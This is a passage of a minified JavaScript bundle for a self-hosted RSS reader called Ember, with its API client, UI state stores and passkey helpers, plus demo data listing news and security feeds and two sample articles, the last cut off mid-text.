$={login:(e,t)=>Q(`POST`,`/api/auth/login`,{username:e,password:t}),logout:()=>Q(`POST`,`/api/auth/logout`),me:()=>Q(`GET`,`/api/me`),changePassword:(e,t)=>Q(`POST`,`/api/me/password`,{old_password:e,new_password:t}),updateSettings:e=>Q(`PATCH`,`/api/me/settings`,{settings_json:e}),listUsers:()=>Q(`GET`,`/api/users`),createUser:e=>Q(`POST`,`/api/users`,e),updateUser:(e,t)=>Q(`PATCH`,`/api/users/${e}`,t),deleteUser:e=>Q(`DELETE`,`/api/users/${e}`),listCategories:()=>Q(`GET`,`/api/categories`),createCategory:e=>Q(`POST`,`/api/categories`,e),updateCategory:(e,t)=>Q(`PATCH`,`/api/categories/${e}`,t),deleteCategory:e=>Q(`DELETE`,`/api/categories/${e}`),reorderCategories:e=>Q(`POST`,`/api/categories/reorder`,{ids:e}),listFeeds:()=>Q(`GET`,`/api/feeds`),addFeed:(e,t)=>Q(`POST`,`/api/feeds`,{url:e,category_id:t}),updateFeed:(e,t)=>Q(`PATCH`,`/api/feeds/${e}`,t),deleteFeed:e=>Q(`DELETE`,`/api/feeds/${e}`),refreshFeed:e=>Q(`POST`,`/api/feeds/${e}/refresh`),reorderFeeds:e=>Q(`POST`,`/api/feeds/reorder`,{ids:e}),resummarizeFeed:e=>Q(`POST`,`/api/feeds/${e}/resummarize`),exportOPML:()=>fetch(`/api/feeds/export`,{credentials:`include`}),importOPML:async e=>{let t=new FormData;t.append(`file`,e);let n={},r=Ji();r&&(n[`X-Ember-CSRF`]=r);let i=await fetch(`/api/feeds/import`,{method:`POST`,credentials:`include`,headers:n,body:t});if(!i.ok){let e=i.statusText;try{let t=await i.json();t?.error?.message&&(e=t.error.message)}catch{}throw new Z(i.status,`http_`+i.status,e)}return i.json()},listArticles:(e={})=>{let t=new URLSearchParams;Object.entries(e).forEach(([e,n])=>{n!=null&&n!==``&&n!==!1&&t.set(e,String(n))});let n=t.toString();return Q(`GET`,`/api/articles${n?`?`+n:``}`)},getArticle:e=>Q(`GET`,`/api/articles/${e}`),setRead:(e,t)=>Q(`POST`,`/api/articles/read`,{ids:e,read:t}),setStar:(e,t)=>Q(`POST`,`/api/articles/star`,{id:e,value:t}),setLater:(e,t)=>Q(`POST`,`/api/articles/later`,{id:e,value:t}),markAllRead:e=>Q(`POST`,`/api/articles/mark-all-read`,e),listFilters:()=>Q(`GET`,`/api/filters`),createFilter:e=>Q(`POST`,`/api/filters`,e),updateFilter:(e,t)=>Q(`PATCH`,`/api/filters/${e}`,t),deleteFilter:e=>Q(`DELETE`,`/api/filters/${e}`),listBoards:()=>Q(`GET`,`/api/boards`),createBoard:e=>Q(`POST`,`/api/boards`,{name:e}),deleteBoard:e=>Q(`DELETE`,`/api/boards/${e}`),addToBoard:(e,t)=>Q(`POST`,`/api/boards/${e}/articles`,{article_id:t}),removeFromBoard:(e,t)=>Q(`DELETE`,`/api/boards/${e}/articles/${t}`),createShare:(e,t,n)=>Q(`POST`,`/api/shares`,{article_id:e,to_user:t,note:n}),inbox:(e=!1)=>Q(`GET`,`/api/shares/inbox${e?`?unseen=1`:``}`),markShareSeen:e=>Q(`POST`,`/api/shares/${e}/seen`),search:(e,t=30)=>Q(`GET`,`/api/search?q=${encodeURIComponent(e)}&limit=${t}`),listSavedSearches:()=>Q(`GET`,`/api/saved-searches`),createSavedSearch:(e,t)=>Q(`POST`,`/api/saved-searches`,{name:e,query:t}),deleteSavedSearch:e=>Q(`DELETE`,`/api/saved-searches/${e}`),listArticleTags:e=>Q(`GET`,`/api/articles/${e}/tags`),addArticleTag:(e,t)=>Q(`POST`,`/api/articles/${e}/tags`,{tag:t}),removeArticleTag:(e,t)=>Q(`DELETE`,`/api/articles/${e}/tags?tag=${encodeURIComponent(t)}`),listUserTags:()=>Q(`GET`,`/api/tags`),getStats:()=>Q(`GET`,`/api/me/stats`),getSmartCounts:()=>Q(`GET`,`/api/me/smart-counts`),getDigest:()=>Q(`GET`,`/api/me/digest`),setDigest:e=>Q(`POST`,`/api/me/digest`,e),listStarterPacks:()=>Q(`GET`,`/api/starter-packs`),importStarterPack:e=>Q(`POST`,`/api/starter-packs/${e}`),removeStarterPack:e=>Q(`DELETE`,`/api/starter-packs/${e}`),getLLMStatus:()=>Q(`GET`,`/api/admin/llm`),setLLMModel:e=>Q(`POST`,`/api/admin/llm/model`,{model:e}),pullLLMModel:e=>Q(`POST`,`/api/admin/llm/pull`,{model:e}),deleteLLMModel:e=>Q(`POST`,`/api/admin/llm/delete`,{model:e}),setLLMOptions:e=>Q(`POST`,`/api/admin/llm/options`,e),getBranding:()=>Q(`GET`,`/api/branding`),setBranding:e=>Q(`POST`,`/api/admin/branding`,e),getDBStatus:()=>Q(`GET`,`/api/admin/db`),dbBackup:()=>Q(`POST`,`/api/admin/db/backup`),dbCleanup:e=>Q(`POST`,`/api/admin/db/cleanup`,{older_days:e}),dbSchedule:e=>Q(`POST`,`/api/admin/db/schedule`,e),getSessionTTL:()=>Q(`GET`,`/api/admin/session`),setSessionTTL:e=>Q(`POST`,`/api/admin/session/ttl`,{ttl_seconds:e}),getAdminSettings:()=>Q(`GET`,`/api/admin/settings`),setAdminSettings:e=>Q(`PATCH`,`/api/admin/settings`,e),testEmail:e=>Q(`POST`,`/api/admin/settings/email-test`,e?{to:e}:{}),reExtractArticle:e=>Q(`POST`,`/api/articles/${e}/extract`),listPasskeys:()=>Q(`GET`,`/api/me/passkeys`),passkeyRegisterBegin:()=>Q(`POST`,`/api/me/passkeys/register/begin`),passkeyRegisterFinish:(e,t,n)=>Q(`POST`,`/api/me/passkeys/register/finish`,{session_id:e,name:t,response:n}),renamePasskey:(e,t)=>Q(`PATCH`,`/api/me/passkeys/${e}`,{name:t}),deletePasskey:e=>Q(`DELETE`,`/api/me/passkeys/${e}`),passkeyLoginBegin:e=>Q(`POST`,`/api/auth/passkey/begin`,{username:e}),passkeyLoginFinish:(e,t)=>Q(`POST`,`/api/auth/passkey/finish`,{session_id:e,response:t}),passkeyAnyRegistered:()=>Q(`GET`,`/api/auth/passkey/exists`)},Yi=ut(null),Xi=ut(``),Zi=ut(``),Qi=ut(6*3600);async function $i(){try{let e=await $.me();return Yi.set(e.data.user),Xi.set(e.data.fever_api_key),Zi.set(e.data.version),e.data.fresh_window_seconds&&e.data.fresh_window_seconds>0&&Qi.set(e.data.fresh_window_seconds),e.data.user}catch(e){if(e instanceof Z&&e.status===401)return Yi.set(null),null;throw e}}async function ea(e,t){let n=await $.login(e,t);Yi.set(n.data)}async function ta(){try{await $.logout()}finally{Yi.set(null)}}var na=ut([]),ra=ut([]),ia=ut([]),aa=ut([]),oa={fresh:0,starred:0,later:0,shared:0,pending_summary:0},sa=ut(oa);async function ca(){let[e,t,n,r,i]=await Promise.all([$.listFeeds(),$.listCategories(),$.listBoards(),$.listSavedSearches(),$.getSmartCounts()]);na.set(e.data??[]),ra.set(t.data??[]),ia.set(n.data??[]),aa.set(r.data??[]),sa.set(i.data??oa)}async function la(){let e=await $.getSmartCounts();sa.set(e.data??oa)}var ua=dt(na,e=>e.reduce((e,t)=>e+(t.unread||0),0)),da=ut({kind:`smart`,view:`fresh`}),fa=ut(null);function pa(e,t){try{return globalThis.localStorage?.getItem(e)||t}catch{return t}}var ma=[{value:`auto`,label:`Auto (OS)`,mood:`light`},{value:`light`,label:`Light`,mood:`light`},{value:`dark`,label:`Dark`,mood:`dark`},{value:`solarized`,label:`Solarized`,mood:`light`},{value:`sepia`,label:`Sepia`,mood:`light`},{value:`nord`,label:`Nord`,mood:`dark`},{value:`gruvbox`,label:`Gruvbox`,mood:`dark`},{value:`contrast`,label:`High contrast`,mood:`dark`},{value:`custom`,label:`Custom`,mood:`light`}],ha=ut(pa(`ember:theme`,`auto`)),ga={paper:`#f6f2e9`,ink:`#211d18`,ember:`#a93b16`,link:`#a93b16`};function _a(){try{let e=globalThis.localStorage?.getItem(`ember:custom`);if(!e)return ga;let t=JSON.parse(e);return{...ga,...t}}catch{return ga}}var va=ut(_a());va.subscribe(e=>{try{globalThis.localStorage?.setItem(`ember:custom`,JSON.stringify(e))}catch{}});var ya={name:`Ember`,page_title:`Ember`,favicon_url:`/ember/demo/icon.svg`},ba=ut(ya);async function xa(){try{let e=await fetch(`/api/branding`,{credentials:`include`});if(!e.ok)return;let t=await e.json(),n={...ya,...t.data};if(ba.set(n),typeof document<`u`){document.title=n.page_title||n.name||`Ember`;let e=document.querySelector(`link[rel="icon"]`);e&&n.favicon_url&&(e.href=n.favicon_url)}}catch{}}var Sa=ut(pa(`ember:density`,`card`)),Ca=ut(pa(`ember:sidebar`,`open`)===`closed`),wa=ut(pa(`ember:show-summary`,`on`)!==`off`),Ta=ut(pa(`ember:summary-collapsed`,`open`)===`closed`);function Ea(e,t,n,r){t.subscribe(t=>{try{globalThis.localStorage?.setItem(e,t?n:r)}catch{}})}Ea(`ember:show-summary`,wa,`on`,`off`),Ea(`ember:summary-collapsed`,Ta,`closed`,`open`);var Da=ut({items:[],loading:!1});function Oa(e){switch(e.kind){case`smart`:return{view:e.view};case`feed`:return{feed_id:e.id};case`category`:return{category_id:e.id};case`board`:return{board_id:e.id};case`search`:return{}}}var ka=ut(0);async function Aa(){let e=ft(da);if(e.kind===`search`)return 0;let t=ft(Da);if(t.loading)return 0;try{let n=Oa(e),r=(await $.listArticles({...n})).data??[];if(r.length===0&&t.items.length===0)return 0;let i=new Set(t.items.map(e=>e.id)),a=r.reduce((e,t)=>i.has(t.id)?e:e+1,0),o=new Set(r.map(e=>e.id)),s=t.items.filter(e=>!o.has(e.id)),c=[...r,...s].sort((e,t)=>{let n=e.published_at??0,r=t.published_at??0;return r===n?t.id-e.id:r-n});return Da.update(e=>({...e,items:c,loading:!1,err:void 0})),a>0&&(ka.update(e=>e+a),ca()),a}catch{return 0}}async function ja(e,t=!1){if(Da.update(e=>({...e,loading:!0,err:void 0})),e.kind===`search`){try{let t=await $.search(e.query,100);Da.update(()=>({items:t.data??[],loading:!1})),ka.set(0)}catch(e){Da.update(t=>({...t,loading:!1,err:String(e)}))}return}try{let n=Oa(e);if(t){let e=ft(Da).cursor;e&&(n.cursor_pub=e.pub,n.cursor_id=e.id)}let r=await $.listArticles(n),i=r.meta??{},a=r.data?.length?{pub:Number(i.next_cursor_pub??0),id:Number(i.next_cursor_id??0)}:void 0;Da.update(e=>({items:t?[...e.items,...r.data??[]]:r.data??[],loading:!1,cursor:a})),t||ka.set(0)}catch(e){Da.update(t=>({...t,loading:!1,err:String(e)}))}}async function Ma(e,t){let n=new Set(e),r=Date.now()/1e3,i=ft(Qi),a=ft(Da).items.reduce((e,a)=>!n.has(a.id)||!a.published_at||r-a.published_at>=i||!!a.is_read===t?e:e+1,0);Da.update(n=>({...n,items:n.items.map(n=>e.includes(n.id)?{...n,is_read:t}:n)})),a!==0&&sa.update(e=>({...e,fresh:Math.max(0,e.fresh+(t?-a:a))}));try{await $.setRead(e,t)}catch(e){throw a!==0&&sa.update(e=>({...e,fresh:Math.max(0,e.fresh+(t?a:-a))})),e}na.update(n=>n.map(n=>{let r=e.filter(e=>ft(Da).items.find(t=>t.id===e)?.feed_id===n.id).length;return r===0?n:{...n,unread:Math.max(0,n.unread+(t?-r:r))}}))}async function Na(e,t){let n=ft(Da).items.find(t=>t.id===e),r=n?t===!!n.is_starred?0:t?1:-1:0;Da.update(n=>({...n,items:n.items.map(n=>n.id===e?{...n,is_starred:t}:n)})),r!==0&&sa.update(e=>({...e,starred:Math.max(0,e.starred+r)}));try{await $.setStar(e,t)}catch(t){throw Da.update(t=>({...t,items:t.items.map(t=>t.id===e?{...t,is_starred:!!n?.is_starred}:t)})),r!==0&&sa.update(e=>({...e,starred:Math.max(0,e.starred-r)})),t}}async function Pa(e,t){let n=ft(Da).items.find(t=>t.id===e),r=n?t===!!n.is_later?0:t?1:-1:0;Da.update(n=>({...n,items:n.items.map(n=>n.id===e?{...n,is_later:t}:n)})),r!==0&&sa.update(e=>({...e,later:Math.max(0,e.later+r)}));try{await $.setLater(e,t)}catch(t){throw Da.update(t=>({...t,items:t.items.map(t=>t.id===e?{...t,is_later:!!n?.is_later}:t)})),r!==0&&sa.update(e=>({...e,later:Math.max(0,e.later-r)})),t}}var Fa=new Set([`INPUT`,`TEXTAREA`,`SELECT`]);function Ia(e){if(e.ctrlKey||e.metaKey||e.altKey)return null;let t=e.target?.tagName?.toUpperCase()??``;if(Fa.has(t))return null;switch(e.key){case`j`:return`next`;case`k`:return`prev`;case`o`:return`open-original`;case`m`:return`toggle-read`;case`s`:return`toggle-star`;case`r`:return`refresh`;case`/`:return`focus-search`;case`?`:return`show-help`;default:return null}}function La(e){let t=t=>{let n=Ia({key:t.key,ctrlKey:t.ctrlKey,metaKey:t.metaKey,altKey:t.altKey,shiftKey:t.shiftKey,target:t.target});n&&(t.preventDefault(),e(n,t))};return window.addEventListener(`keydown`,t),()=>window.removeEventListener(`keydown`,t)}var Ra=new Map,za=64,Ba=11,Va=14,Ha=za-14,Ua=za-14,Wa=`#22c55e`,Ga=`rgba(255, 255, 255, 0.95)`;function Ka(e,t){return`${e}|${+!!t}`}function qa(e){return new Promise((t,n)=>{let r=new Image;r.crossOrigin=`anonymous`,r.onload=()=>t(r),r.onerror=e=>n(e),r.src=e})}async function Ja(e,t){let n=Ka(e,t),r=Ra.get(n);if(r)return r;if(typeof document>`u`)return e;let i;try{i=await qa(e)}catch{return e}let a=document.createElement(`canvas`);a.width=za,a.height=za;let o=a.getContext(`2d`);if(!o)return e;o.drawImage(i,0,0,za,za),t&&(o.fillStyle=Ga,o.beginPath(),o.arc(Ha,Ua,Va,0,Math.PI*2),o.fill(),o.fillStyle=Wa,o.beginPath(),o.arc(Ha,Ua,Ba,0,Math.PI*2),o.fill());try{let e=a.toDataURL(`image/png`);return Ra.set(n,e),e}catch{return e}}function Ya(e){let t=(e+`=`.repeat((4-e.length%4)%4)).replace(/-/g,`+`).replace(/_/g,`/`),n=atob(t),r=new Uint8Array(n.length);for(let e=0;e<n.length;e++)r[e]=n.charCodeAt(e);return r}function Xa(e){let t=e instanceof Uint8Array?e:new Uint8Array(e),n=``;for(let e of t)n+=String.fromCharCode(e);return btoa(n).replace(/\+/g,`-`).replace(/\//g,`_`).replace(/=+$/,``)}function Za(e){let t={...e};return t.challenge=Ya(e.challenge),t.user={...e.user,id:Ya(e.user.id)},Array.isArray(e.excludeCredentials)&&(t.excludeCredentials=e.excludeCredentials.map(e=>({...e,id:Ya(e.id)}))),t}function Qa(e){let t={...e};return t.challenge=Ya(e.challenge),Array.isArray(e.allowCredentials)&&(t.allowCredentials=e.allowCredentials.map(e=>({...e,id:Ya(e.id)}))),t}function $a(e){let t=e.response,n={id:e.id,rawId:Xa(e.rawId),type:e.type,clientExtensionResults:e.getClientExtensionResults?e.getClientExtensionResults():{},response:{clientDataJSON:Xa(t.clientDataJSON)}};if(`attestationObject`in t){n.response.attestationObject=Xa(t.attestationObject);let e=t.getTransports?.();Array.isArray(e)&&(n.response.transports=e)}else{let e=t;n.response.authenticatorData=Xa(e.authenticatorData),n.response.signature=Xa(e.signature),e.userHandle&&(n.response.userHandle=Xa(e.userHandle))}return n}async function eo(e){let t=Za(e.publicKey),n=await navigator.credentials.create({publicKey:t});if(!n)throw Error(`registration cancelled`);return $a(n)}async function to(e){let t=Qa(e.publicKey),n=await navigator.credentials.get({publicKey:t});if(!n)throw Error(`authentication cancelled`);return $a(n)}function no(){return typeof window<`u`&&window.PublicKeyCredential!==void 0}var ro={captured_at:`2026-06-03`,me:{user:{id:1,username:`demo`,is_admin:!1,settings_json:`{}`,created_at:1780348558},fever_api_key:`demo-fever-key`,version:`docker`,fresh_window_seconds:21600},branding:{name:`Ember`,page_title:`Ember`,favicon_url:``},categories:[{id:2,user_id:1,name:`Programming`,color:`#1d4ed8`,position:0,created_at:1780509343},{id:4,user_id:1,name:`Security`,color:`#991b1b`,position:0,created_at:1780509343},{id:1,user_id:1,name:`Technology`,color:`#a93b16`,position:0,created_at:1780509343},{id:3,user_id:1,name:`World News`,color:`#623ce6`,position:0,created_at:1780509343}],feeds:[{id:11,url:`https://www.aljazeera.com/xml/rss/all.xml`,site_url:`https://www.aljazeera.com`,title:`Al Jazeera – Breaking News, World News and Video from Al Jazeera`,etag:`W/"7e9d29b79ff70cabed9a8035caef6f72"`,last_modified:`Wed, 03 Jun 2026 17:36:51 GMT`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:11,category_id:3,muted:!1,position:0,unread:25},{id:15,url:`https://www.cisa.gov/cybersecurity-advisories/all.xml`,site_url:`https://www.cisa.gov/`,title:`All CISA Advisories`,last_fetched:1780509343,next_fetch:1780511143,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:15,category_id:4,muted:!1,position:0,unread:2},{id:2,url:`https://feeds.arstechnica.com/arstechnica/index`,site_url:`https://arstechnica.com`,title:`Ars Technica - All content`,last_modified:`Wed, 3 Jun 2026 12:44:04 GMT`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:2,category_id:1,muted:!1,position:0,unread:20},{id:9,url:`http://feeds.bbci.co.uk/news/world/rss.xml`,site_url:`https://www.bbc.co.uk/news/world`,title:`BBC News`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:9,category_id:3,muted:!1,position:0,unread:23},{id:7,url:`https://engineering.fb.com/feed/`,site_url:`https://engineering.fb.com/`,title:`Engineering at Meta`,etag:`W/"bb24a0b0c0b428ef200eee0ec355e60e"`,last_modified:`Wed, 03 Jun 2026 16:52:48 GMT`,last_fetched:1780509343,next_fetch:1780512043,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:7,category_id:2,muted:!1,position:0,unread:0},{id:1,url:`https://hnrss.org/frontpage`,site_url:`https://news.ycombinator.com/`,title:`Hacker News: Front Page`,last_modified:`Wed, 03 Jun 2026 17:39:53 GMT`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:1,category_id:1,muted:!1,position:0,unread:20},{id:13,url:`https://krebsonsecurity.com/feed/`,site_url:`https://krebsonsecurity.com`,title:`Krebs on Security`,last_modified:`Mon, 01 Jun 2026 19:02:50 GMT`,last_fetched:1780509343,next_fetch:1780512043,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:13,category_id:4,muted:!1,position:0,unread:0},{id:6,url:`https://lobste.rs/rss`,site_url:`https://lobste.rs/`,title:`Lobsters`,etag:`"dizlvo8ald65c3d-gzip"`,last_modified:`Wed, 03 Jun 2026 17:55:25 GMT`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:6,category_id:2,muted:!1,position:0,unread:25},{id:4,url:`https://lwn.net/headlines/rss`,site_url:`https://lwn.net`,title:`LWN.net`,etag:`"5700ffeec1be254a6db797a77c4bd94682715921486507f80b8059b717eb2ebc"`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:4,category_id:1,muted:!1,position:0,unread:10},{id:10,url:`https://feeds.npr.org/1004/rss.xml`,site_url:`https://www.npr.org/templates/story/story.php?storyId=1004`,title:`NPR Topics: World`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:10,category_id:3,muted:!1,position:0,unread:10},{id:14,url:`https://www.schneier.com/feed/atom/`,site_url:`https://www.schneier.com/`,title:`Schneier on Security`,etag:`W/"4fcd4f9a111e3a8f75de31bf96d14d96"`,last_modified:`Wed, 03 Jun 2026 11:04:52 GMT`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:14,category_id:4,muted:!1,position:0,unread:3},{id:8,url:`https://stackoverflow.blog/feed/`,site_url:`https://stackoverflow.blog/`,title:`Stack Overflow Blog`,etag:`"b60313f4c21201f47d7a944572916e81-ssl-df"`,last_fetched:1780509343,next_fetch:1780511143,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:8,category_id:2,muted:!1,position:0,unread:1},{id:5,url:`https://go.dev/blog/feed.atom`,title:`The Go Blog`,last_fetched:1780509343,next_fetch:1780512043,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:5,category_id:2,muted:!1,position:0,unread:0},{id:16,url:`https://feeds.feedburner.com/TheHackersNews`,site_url:`https://thehackernews.com`,title:`The Hacker News`,last_modified:`Wed, 3 Jun 2026 13:13:21 GMT`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:16,category_id:4,muted:!1,position:0,unread:13},{id:3,url:`https://www.theverge.com/rss/index.xml`,site_url:`https://www.theverge.com`,title:`The Verge`,etag:`W/"66cca88d3fb055e5d24ef1c5e6754e46"`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:3,category_id:1,muted:!1,position:0,unread:10},{id:12,url:`https://www.theguardian.com/world/rss`,site_url:`https://www.theguardian.com/world`,title:`World news | The Guardian`,etag:`W/"hash8711850189967243502"`,last_fetched:1780509343,next_fetch:1780510243,fetch_interval:1800,error_count:0,created_at:1780509343,subscription_id:12,category_id:3,muted:!1,position:0,unread:33}],boards:null,filters:null,savedSearches:null,tags:null,starterPacks:[{slug:`technology`,name:`Technology`,color:`#a93b16`,feed_urls:[`https://hnrss.org/frontpage`,`https://feeds.arstechnica.com/arstechnica/index`,`https://www.theverge.com/rss/index.xml`,`https://lwn.net/headlines/rss`],subscribed:4},{slug:`programming`,name:`Programming`,color:`#1d4ed8`,feed_urls:[`https://go.dev/blog/feed.atom`,`https://lobste.rs/rss`,`https://engineering.fb.com/feed/`,`https://stackoverflow.blog/feed/`],subscribed:4},{slug:`security`,name:`Security`,color:`#991b1b`,feed_urls:[`https://krebsonsecurity.com/feed/`,`https://www.schneier.com/feed/atom/`,`https://www.cisa.gov/cybersecurity-advisories/all.xml`,`https://feeds.feedburner.com/TheHackersNews`],subscribed:4},{slug:`devops`,name:`DevOps & Infra`,color:`#0a7b3a`,feed_urls:[`https://www.hashicorp.com/blog/feed.xml`,`https://kubernetes.io/feed.xml`,`https://aws.amazon.com/about-aws/whats-new/recent/feed/`,`https://www.docker.com/blog/feed/`],subscribed:0},{slug:`world`,name:`World News`,color:`#623ce6`,feed_urls:[`http://feeds.bbci.co.uk/news/world/rss.xml`,`https://feeds.npr.org/1004/rss.xml`,`https://www.aljazeera.com/xml/rss/all.xml`,`https://www.theguardian.com/world/rss`],subscribed:4}],stats:{articles_read_today:0,articles_read_week:0,articles_read_month:0,starred_total:0,later_total:0,subscriptions:16,top_feeds:null},articles:[{id:1,feed_id:3,guid:`https://www.theverge.com/?p=942629`,url:`https://www.theverge.com/ai-artificial-intelligence/942629/as-ai-gets-better-it-reveals-an-empty-promise`,title:`As AI gets better, it reveals an empty promise`,author:`TC. Sottek`,content_html:`
+
+						
+<figure>
+
+<img alt="" data-caption="" data-portal-copyright="Graphics by Michele Doying / The Verge" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/11503853/mdoying_180419_1777_0454_2.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+		</figcaption>
+</figure>
+<p class="has-text-align-none">This week we've got tandem hands-ons with Google's new Gemini AI agent - Spark - from my colleagues <a href="https://www.theverge.com/ai-artificial-intelligence/941388/gemini-spark-ai-agent-trip-planning">David Pierce</a> and <a href="https://www.theverge.com/tech/941138/google-gemini-spark-ai-agent-hands-on">Jay Peters</a>. Their takeaways are similar: It's so effective that it's scary. Spark knew that David's dog is named Frida and knew the first name of Jay's wife, even though neither of them explicitly provided this information to Google. But what's scary to <em>me </em>is how all of this stuff seems geared toward a future of "productivity" that completely misses what needs to be fixed in our world.</p>
+<p class="has-text-align-none">"Productivity" is often pitched as a panacea for what befalls us in our personal lives, even going so far as to implicate our moral worthiness …</p>
+<p><a href="https://www.theverge.com/ai-artificial-intelligence/942629/as-ai-gets-better-it-reveals-an-empty-promise">Read the full story at The Verge.</a></p>
+						`,content_text:`This week we've got tandem hands-ons with Google's new Gemini AI agent - Spark - from my colleagues David Pierce and Jay Peters . Their takeaways are similar: It's so effective that it's scary. Spark knew that David's dog is named Frida and knew the first name of Jay's wife, even though neither of them explicitly provided this information to Google. But what's scary to me is how all of this stuff seems geared toward a future of "productivity" that completely misses what needs to be fixed in our world. "Productivity" is often pitched as a panacea for what befalls us in our personal lives, even going so far as to implicate our moral worthiness … Read the full story at The Verge.`,summary:`• As AI gets better, it reveals an empty promise: It's so effective that it's scary. Spark knew that David's dog is named Frida and knew the first name of Jay's wife, even though neither of them explicitly provided this information to Google. What's scary to me is how all of this stuff seems geared toward a future of "productivity" that completely misses what needs to be fixed in our world.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/11503853/mdoying_180419_1777_0454_2.jpg?quality=90&strip=all&crop=0,0,100,100`,published_at:1780508735,fetched_at:1780509343,content_hash:`7a156145f0271d6fbefe29983852da4be311fd2d7421c9531f3aba7914cb60b6`,tags:`AI`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:32,feed_id:1,guid:`https://news.ycombinator.com/item?id=48387095`,url:`https://news.ycombinator.com/item?id=48387095`,title:`Launch HN: Hyper (YC P26) – Company brain to power agentic development`,author:`shalinshah`,content_html:`
+<p>Hey HN, we’re Shalin & Kanyes, best friends who've been hacking together for 10+yrs, and now founders of Hyper (<a href="https://heyhyper.ai/">https://heyhyper.ai/</a>). Hyper is a shared “company brain” that plugs into information flowing inside a company to make AI agents and automations better and ultimately save people time.<p>Models have gotten good enough that they can (mostly) take on long-horizon, complex tasks. We believe the bottleneck now is that these smart-enough models often lack information about your company, which is scattered in people's heads, Slack threads, stale docs, and in back-and-forth convos with AI.<p>MCP is useful for getting some info in front of an agent, but there are problems: (1) Once the session dies, so does the insight, so instead of copy-pasting a whole doc each time you're telling the agent to dig through Drive each time - not much of a win; (2) Even when MCP works, what it gathers isn't comprehensive, because people decide things on a whiteboard, brainstorm out loud, post a little in Slack, and scribble the rest in a doc, which leaves the agent working from partial information; (3)  And even if it had everything, it doesn't do the meta-reasoning required to do a great job. If you paste in a Notion doc and it won't learn your design taste or your writing style unless you tell it to, and it won't know why a decision was made or when.<p>As undergrads 5 years ago, we were into the tools-for-thought wave and became power users of Notion, Obsidian, Roam, Anki, real believers in building a second brain. After GPT-3.5 came out we started to realize how much more powerful that second brain could be if an AI could actually read it, because suddenly it would know our backstory, our taste, our preferences, and unlock genuinely new capabilities. That’s <i>why</i> we’re building Hyper.<p>We know it’s not for everybody! But for people who do want to be on the cutting edge, this is a force multiplier that makes agents faster and better. It increases the number of tasks they can do, and how effectively they do them.<p>Hyper works by ingesting everything you give it access to, Docs, Slack, Email, Calendar, Granola, and synthesizes it into a knowledge graph of facts and their relationships with embeddings for semantic search. The memory system we’ve built is hybrid, with two modalities. Episodes are the raw source items kept as the source of truth. Facts are the meaning pulled out of each episode, stored as subject-predicate-object records with a plain summary and timestamps for when the fact was introduced and when it was invalidated (subject=person, predicate=works_at, object=company). Facts form a graph with typed edges between them: X is in tension with Y, A is derived from B, J supersedes K. Every time a new fact comes in we update the facts in its neighborhood, so the graph stays current, and that's how we handle stale information. When "we'll ship Friday" is later contradicted by "we're shipping Monday," the new fact supersedes the old one instead of both looking equally true, and we never auto-discard the superseded version, so you can still ask how you landed on Monday.<p>Every fact carries provenance back to its source and access-control tags for who is allowed to see it. At retrieval we query-expand, then fuse semantic search over embeddings with Postgres full-text search using reciprocal rank fusion, and we only ever evaluate a query against the facts and episodes that person has access to, which means two people on the same team can ask the same question and get different answers. We keep information fresh with webhooks where they exist and polling where they don't, hashing contents to catch changes for sources that don’t handle native dedupe. Agents read and write through two paths: lifecycle hooks in tools like Claude Code, Cowork, Codex, and Cursor, where we inject relevant context on every prompt and pull interesting facts out of every response, and plain MCP tool calls for everything that doesn't expose hooks.<p>We love it! and so do our early users: one CEO uses Hyper to draft emails in his voice with full company context. What took hours/week now takes minutes and gets sharper each time Hyper learns more how he thinks and how his company is changing. One YC founder one-shotted a launch video script because Hyper already knew their product, voice, positioning accumulated over months.<p>We have a 3-day free trial, explained more on our pricing page (<a href="https://heyhyper.ai/pricing">https://heyhyper.ai/pricing</a>) and there are more details in our FAQ (<a href="https://heyhyper.ai/faq">https://heyhyper.ai/faq</a>), including things like privacy, compliance, and how we’re different from other “memory” companies..<p>Give it a spin! break it! and tell us where it falls short: <a href="https://heyhyper.ai/">https://heyhyper.ai/</a>. We'd love to build you a 10-star experience :) Comments welcome!</p>
+<hr>
+<p>Comments URL: <a href="https://news.ycombinator.com/item?id=48387095">https://news.ycombinator.com/item?id=48387095</a></p>
+<p>Points: 8</p>
+<p># Comments: 0</p>
+`,content_text:`Hey HN, we’re Shalin & Kanyes, best friends who've been hacking together for 10+yrs, and now founders of Hyper ( https://heyhyper.ai/ ). Hyper is a shared “company brain” that plugs into information flowing inside a company to make AI agents and automations better and ultimately save people time. Models have gotten good enough that they can (mostly) take on long-horizon, complex tasks. We believe the bottleneck now is that these smart-enough models often lack information about your company, which is scattered in people's heads, Slack threads, stale docs, and in back-and-forth convos with AI. MCP is useful for getting some info in front of an agent, but there are problems: (1) Once the session dies, so does the insight, so instead of copy-pasting a whole doc each time you're telling the agent to dig through Drive each time - not much of a win; (2) Even when MCP works, what it gathers isn't comprehensive, because people decide things on a whiteboard, brainstorm out loud, post a little in Slack, and scribble the rest in a doc, which 